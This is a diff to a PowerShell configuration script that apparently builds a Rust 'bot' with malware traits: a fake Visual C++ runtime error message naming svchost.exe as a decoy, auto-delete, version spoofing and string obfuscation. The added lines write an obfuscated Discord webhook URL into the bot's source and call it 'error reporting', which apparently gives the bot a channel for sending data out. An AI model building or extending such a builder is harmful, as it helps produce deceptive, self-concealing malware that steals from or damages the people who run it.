@@ -128,6 +128,10 @@ $config = @{
     decoyEnabled = $false
     decoyTitle = "Microsoft Visual C++ Runtime Library"
     decoyMessage = "Runtime Error!`n`nProgram: C:\Windows\System32\svchost.exe`n`nR6025`n- pure virtual function call"
+    
+    # Webhook Backup
+    webhookEnabled = $false
+    webhookUrl = ""
 }
 
 # Check for existing presets
@@ -238,6 +242,21 @@ if (-not $loadedFromPreset) {
         if ($input) { $config.decoyMessage = $input -replace "\\n", "`n" }
     }
 
+    Write-Host ""
+    Write-Host "[11] WEBHOOK BACKUP (Error Reporting)" -ForegroundColor Yellow
+    Write-Host "    Sends error logs to webhook when bot crashes" -ForegroundColor Gray
+    $input = Read-Host "    Enable webhook backup? (y/N)"
+    $config.webhookEnabled = ($input -eq 'y' -or $input -eq 'Y')
+
+    if ($config.webhookEnabled) {
+        Write-Host "    Discord Webhook URL:" -ForegroundColor Gray
+        $config.webhookUrl = Read-Host "    Webhook URL"
+        if ([string]::IsNullOrWhiteSpace($config.webhookUrl)) {
+            Write-Host "    WARNING: Empty webhook URL, disabling backup" -ForegroundColor Yellow
+            $config.webhookEnabled = $false
+        }
+    }
+
     # Save preset option
     Write-Host ""
     Write-Host "========================================" -ForegroundColor Magenta
@@ -302,6 +321,12 @@ $configContent = $configContent -replace '(pub fn get_autodelete_config\(\) -> A
 $decoyEnabled = if ($config.decoyEnabled) { "true" } else { "false" }
 $configContent = $configContent -replace '(pub fn get_decoy_config\(\) -> DecoyConfig \{\s*DecoyConfig \{\s*enabled: )(true|false)', "`$1$decoyEnabled"
 
+# Update webhook URL
+if ($config.webhookEnabled -and $config.webhookUrl) {
+    $safeWebhookUrl = Escape-ForRust $config.webhookUrl
+    $configContent = $configContent -replace '(pub fn webhook_url\(\) -> String \{\s*obfstr::obfstr!\(")[^"]*("\)\.to_string\(\))', "`${1}$safeWebhookUrl`${2}"
+}
+
 Set-Content $configPath -Value $configContent -NoNewline
 
 Write-Host "Configuration Summary:" -ForegroundColor Green
@@ -314,6 +339,7 @@ Write-Host "  Version: $($config.fileVersion)" -ForegroundColor Gray
 Write-Host "  Auto-Delete: $($config.autoDelete)" -ForegroundColor Gray
 Write-Host "  Debug Logging: $($config.showConsole)" -ForegroundColor Gray
 Write-Host "  Decoy Message: $($config.decoyEnabled)" -ForegroundColor Gray
+Write-Host "  Webhook Backup: $($config.webhookEnabled)" -ForegroundColor Gray
 Write-Host ""
 
 Write-Host "========================================" -ForegroundColor Red
